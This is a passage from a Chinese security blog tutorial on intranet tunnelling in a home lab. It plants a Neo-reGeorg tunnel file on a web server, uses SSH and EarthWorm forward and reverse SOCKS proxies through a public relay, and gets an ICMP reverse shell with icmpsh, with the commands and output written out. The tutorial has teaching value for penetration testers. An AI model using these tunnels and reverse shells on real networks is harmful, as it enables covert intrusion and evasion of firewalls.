punctuation\">\\</span>Users<span class=\"token punctuation\">\\</span>Public<span class=\"token punctuation\">\\</span>Downloads<span class=\"token punctuation\">\\</span>PHPTutorial<span class=\"token punctuation\">\\</span>WWW<span class=\"token operator\">></span>dir\n 驱动器 C 中的卷没有标签。\n 卷的序列号是 96A7-C0CC\n\n C:<span class=\"token punctuation\">\\</span>Users<span class=\"token punctuation\">\\</span>Public<span class=\"token punctuation\">\\</span>Downloads<span class=\"token punctuation\">\\</span>PHPTutorial<span class=\"token punctuation\">\\</span>WWW 的目录\n\n<span class=\"token number\">2022</span>/08/28  <span class=\"token number\">19</span>:31    <span class=\"token operator\">&lt;</span>DIR<span class=\"token operator\">></span>          <span class=\"token builtin class-name\">.</span>\n<span class=\"token number\">2022</span>/08/28  <span class=\"token number\">13</span>:29    <span class=\"token operator\">&lt;</span>DIR<span class=\"token operator\">></span>          <span class=\"token punctuation\">..</span>\n<span class=\"token number\">2017</span>/03/28  <span class=\"token number\">16</span>:59                <span class=\"token number\">28</span> index.php\n<span class=\"token number\">2017</span>/04/20  <span class=\"token number\">16</span>:49            <span class=\"token number\">21,175</span> l.php\n<span class=\"token number\">2013</span>/05/09  <span class=\"token number\">20</span>:56                <span class=\"token number\">23</span> phpinfo.php\n<span class=\"token number\">2022</span>/08/28  <span class=\"token number\">13</span>:29    <span class=\"token operator\">&lt;</span>DIR<span class=\"token operator\">></span>          phpMyAdmin\n<span class=\"token number\">2022</span>/08/28  <span class=\"token number\">19</span>:32             <span class=\"token number\">5,910</span> tunnel.php\t\t<span class=\"token comment\"># 隧道文件</span>\n               <span class=\"token number\">4</span> 个文件         <span class=\"token number\">27,136</span> 字节\n               <span class=\"token number\">3</span> 个目录 <span class=\"token number\">247,923</span>,822,592 可用字节<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"3-连接主机\"><a href=\"#3-连接主机\" class=\"headerlink\" title=\"3. 连接主机\"></a>3. 连接主机</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">┌──<span class=\"token punctuation\">(</span>root㉿kali-linux-2022-2<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>/home/kali/Neo-reGeorg<span class=\"token punctuation\">]</span>\n└─<span class=\"token comment\"># python3 neoreg.py -k 123456 -u http://192.168.2.7/tunnel.php</span>\n\n\n          \"<span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>$<span class=\"token string\">$''</span>  <span class=\"token string\">'M$  '</span><span class=\"token variable\">$$</span><span class=\"token variable\">$@</span>m\n        <span class=\"token builtin class-name\">:</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>$<span class=\"token string\">$''</span><span class=\"token variable\">$$</span>$<span class=\"token string\">$'\n       '</span><span class=\"token string\">$'    '</span>JZI<span class=\"token string\">'$$&amp;  $$$$'</span>\n                 <span class=\"token string\">'$$$  '</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>\n                 <span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>  J<span class=\"token variable\">$$</span>$<span class=\"token string\">$'\n                m$$$$  $$$$,\n                $$$$@  '</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>_          Neo-reGeorg\n             <span class=\"token string\">'1t$$$$'</span> <span class=\"token string\">'$$$$&lt;\n          '</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>$<span class=\"token string\">$'  $$$$          version 3.8.1\n               '</span>@<span class=\"token variable\">$$</span>$<span class=\"token string\">$'  $$$$'</span>\n                <span class=\"token string\">'$$$$  '</span><span class=\"token variable\">$$</span><span class=\"token variable\">$@</span>\n             <span class=\"token string\">'z$$$$$$  @$$$\n                r$$$   $$|\n                '</span><span class=\"token variable\">$$</span><span class=\"token function\">v</span> c<span class=\"token variable\">$$</span>\n               <span class=\"token string\">'$$v $$v$$$$$$$$$#\n               $$x$$$$$$$$$twelve$$$@$'</span>\n             @<span class=\"token variable\">$$</span><span class=\"token variable\">$@</span>L <span class=\"token string\">'    '</span><span class=\"token operator\">&lt;</span>@<span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span><span class=\"token variable\">$$</span>`\n           <span class=\"token variable\">$$</span>                 '<span class=\"token variable\">$$</span>$\n\n\n    <span class=\"token punctuation\">[</span> Github <span class=\"token punctuation\">]</span> https://github.com/L-codes/Neo-reGeorg\n\n+------------------------------------------------------------------------+\n  Log Level <span class=\"token builtin class-name\">set</span> to <span class=\"token punctuation\">[</span>ERROR<span class=\"token punctuation\">]</span>\n  Starting SOCKS5 server <span class=\"token punctuation\">[</span><span class=\"token number\">127.0</span>.0.1:1080<span class=\"token punctuation\">]</span>\n  Tunnel at:\n    http://192.168.2.7/tunnel.php\n+------------------------------------------------------------------------+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"4-配置SOCKS5代理并访问目标主机\"><a href=\"#4-配置SOCKS5代理并访问目标主机\" class=\"headerlink\" title=\"4. 配置SOCKS5代理并访问目标主机\"></a>4. 配置SOCKS5代理并访问目标主机</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">┌──<span class=\"token punctuation\">(</span>root㉿kali-linux-2022-2<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>~<span class=\"token punctuation\">]</span>\n└─<span class=\"token comment\"># curl --socks5 127.0.0.1:1080 http://192.168.2.5/1.html</span>\nhello<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"貳、SSH隧道\"><a href=\"#貳、SSH隧道\" class=\"headerlink\" title=\"貳、SSH隧道\"></a>貳、SSH隧道</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\tSSH 会自动加密和解密所有SSH 客户端与服务端之间的网络数据。但是，SSH 还能够将其他TCP 端口的网络数据通过SSH 链接来转发， 并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”(tunneling），这是因为SSH为其他TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP这些TCP应用均能够从中得益，避免了用户名，密码\u0018以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够通过将TCP端口转发来使用SSH进行通讯。</p></blockquote>\n<h4 id=\"1、SSH本地转发\"><a href=\"#1、SSH本地转发\" class=\"headerlink\" title=\"1、SSH本地转发\"></a>1、SSH本地转发</h4><pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">ssh -CfNg -L 8888:192.168.2.5:80 parallels@192.168.2.8<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>输入跳板机 <strong>parallels</strong> 的SSH密码，即可本地访问localhost:8888，实现对 <strong>192.168.2.5:80</strong> 的访问。</p>\n<h4 id=\"2、SSH远程转发\"><a href=\"#2、SSH远程转发\" class=\"headerlink\" title=\"2、SSH远程转发\"></a>2、SSH远程转发</h4><pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">ssh -CfNg -R 8888:192.168.2.5:80 kali@192.168.2.14<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在Kali上访问 <strong>http:&#x2F;localhost:8888</strong>即可访问到 <strong>192.168.2.5:80</strong></p>\n<h3 id=\"叁、EarthWorm\"><a href=\"#叁、EarthWorm\" class=\"headerlink\" title=\"叁、EarthWorm\"></a>叁、EarthWorm</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\t内网穿透神器EarthWorm，(简称EW)是一套轻量便携且功能强大的网络穿透工具，基于标准C开发，具有socks5代理、端口转发、端口映射三大功能。相较于其他穿透工具，如reGeorg等，EarthWorm可以穿透更复杂的内网环境同时也不需要跳板机运行web服务，也可以支持多平台间的转接通讯，如Linux、Windows、MacOS、Arm-Linux等。</p>\n<p>下载地址：<a href=\"https://github.com/mrawb/ew/blob/master/ewforlinuX64\">https://github.com/mrawb/ew/blob/master/ewforlinuX64</a></p>\n<p>本工具目前已经不再更新</p></blockquote>\n<h4 id=\"1、正向代理\"><a href=\"#1、正向代理\" class=\"headerlink\" title=\"1、正向代理\"></a>1、正向代理</h4><p>在 <strong>Windows 11[192.168.2.7]</strong> 上运行</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">ew_for_win_32.exe -s ssocksd -1 1080<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在Kali中使用 <strong>192.168.2.7:1080</strong> 为SOCKS5代理</p>\n<h4 id=\"2、反弹代理\"><a href=\"#2、反弹代理\" class=\"headerlink\" title=\"2、反弹代理\"></a>2、反弹代理</h4><p>（1）在公网服务器 <strong>CentOS [120.48.33.217]</strong> 运行</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./ew_for_linux64 -s rcsocks -l <span class=\"token number\">8080</span> -e <span class=\"token number\">8081</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p>（2)在 <strong>Windows 11 [192.168.2.7]</strong> 上，运行</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">.&#x2F;ew_for_win_32.exe -s rssocks -d 120.48.33.217 -e 8081<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p>（3）在Kali上配置SOCKS5代理服务器 <strong>120.48.33.217:8081</strong></p>\n<h2 id=\"四、基于ICMP协议的隧道\"><a href=\"#四、基于ICMP协议的隧道\" class=\"headerlink\" title=\"四、基于ICMP协议的隧道\"></a>四、基于ICMP协议的隧道</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>​\t\ticmp隧道搭建的场景主要用于在拦截策略关闭了端口，而ICMP协议用于检测网络连通状态，不依赖于端口开放，防火墙通常会开放此协议。常见的ICMP隧道工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p></blockquote>\n<h4 id=\"1、icmpsh\"><a href=\"#1、icmpsh\" class=\"headerlink\" title=\"1、icmpsh\"></a>1、icmpsh</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>受控端（客户端）使用C语言实现。只能运行在目标Windows机器上，而<strong>主控端可以运行在任何平台</strong>的攻击机中。</p>\n<p>下载地址：<a href=\"https://github.com/inquisb/icmpsh\">https://github.com/inquisb/icmpsh</a></p></blockquote>\n<p>（1）在攻击主机 <strong>Kali[192.168.2.14]</strong> 上运行以下指令</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./icmpsh_m.py <span class=\"token number\">192.168</span>.2.14 <span class=\"token number\">192.168</span>.2.7  <span class=\"token comment\"># python2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p>（2）在目标主机 <strong>Windows 11[192.168.2.7]</strong> 上运行icmpsh.exe</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">icmpsh.exe -t <span class=\"token number\">192.168</span>.2.14  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>​\t\t</p>\n<p>（3）因为icmpsh工具要代替系统本身的ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP答应(如果要恢复系统答应，则设置为0)，否则Shell的运行会不稳定。在Kali上修改以下参数</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">sysctl -w net.ipv4.icmp_echo_ignore_al1<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token comment\">#设置为0可以还原</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果提示：<strong>You need to install Python Impacket library first</strong>  则运行以下命令安装依赖。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> clone https://github.com/SecureAuthcorp/impacket.git\n<span class=\"token builtin class-name\">cd</span> impacket\npip <span class=\"token function\">install</span> -r requirements.txt\npython setup.py <span class=\"token function\">install</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>（4）成功返回Shell</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">┌──<span class=\"token punctuation\">(</span>root㉿kali-linux-2022-2<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>/home/kali<span class=\"token punctuation\">]</span>\n└─<span class=\"token comment\"># ./icmpsh_m.py 192.168.2.14 192.168.2.7</span>\nMicrosoft Windows <span class=\"token punctuation\">[</span>°汾 <span class=\"token number\">5.2</span>.3790<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span> °爨̹Ԑ <span class=\"token number\">1985</span>-2003 Microsoft Corp.\n\nC:<span class=\"token punctuation\">\\</span>icmpsh<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":" ​ 内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。 一、端口转发壹、 netsh端口转发 ​ 通过利用本客户机端口映射到服务器端口来工作。多数情况下，这一过程对连接的两端而言都是...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/categories/网络安全.json"},{"name":"工具使用","slug":"网络安全/工具使用","count":3,"path":"api/categories/网络安全/工具使用.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/tags/网络安全.json"},{"name":"工具使用","slug":"工具使用","count":3,"path":"api/tags/工具使用.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">一、端口转发</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A3%B9%E3%80%81-netsh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">壹、 netsh端口转发</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87\"><span class=\"toc-text\">1. 环境准备</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">2. 配置端口转发</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%B2%B3%E3%80%81MSF%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">貳、MSF端口转发</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">1. 生成木马</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-1\"><span class=\"toc-text\">2. 配置端口转发</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">3. 访问本地端口</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84\"><span class=\"toc-text\">二、端口映射</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A3%B9%E3%80%81FRP%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84\"><span class=\"toc-text\">壹、FRP端口映射</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-SSH-%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">1. SSH 服务</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-HTTP-%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">2. HTTP 服务</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E5%BC%80%E5%90%AFDashboard\"><span class=\"toc-text\">3. 开启Dashboard</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E9%9A%A7%E9%81%93\"><span class=\"toc-text\">三、隧道</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A3%B9%E3%80%81Neo-reGorg\"><span class=\"toc-text\">壹、Neo-reGorg</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E7%94%9F%E6%88%90%E9%9A%A7%E9%81%93%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">1. 生成隧道文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E6%A4%8D%E5%85%A5%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">2. 植入文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E8%BF%9E%E6%8E%A5%E4%B8%BB%E6%9C%BA\"><span class=\"toc-text\">3. 连接主机</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E9%85%8D%E7%BD%AESOCKS5%E4%BB%A3%E7%90%86%E5%B9%B6%E8%AE%BF%E9%97%AE%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA\"><span class=\"toc-text\">4. 配置SOCKS5代理并访问目标主机</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%B2%B3%E3%80%81SSH%E9%9A%A7%E9%81%93\"><span class=\"toc-text\">貳、SSH隧道</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1%E3%80%81SSH%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">1、SSH本地转发</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2%E3%80%81SSH%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91\"><span class=\"toc-text\">2、SSH远程转发</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%81%E3%80%81EarthWorm\"><span class=\"toc-text\">叁、EarthWorm</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1%E3%80%81%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86\"><span class=\"toc-text\">1、正向代理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%8F%8D%E5%BC%B9%E4%BB%A3%E7%90%86\"><span class=\"toc-text\">2、反弹代理</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E5%9F%BA%E4%BA%8EICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%9A%A7%E9%81%93\"><span class=\"toc-text\">四、基于ICMP协议的隧道</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1%E3%80%81icmpsh\"><span 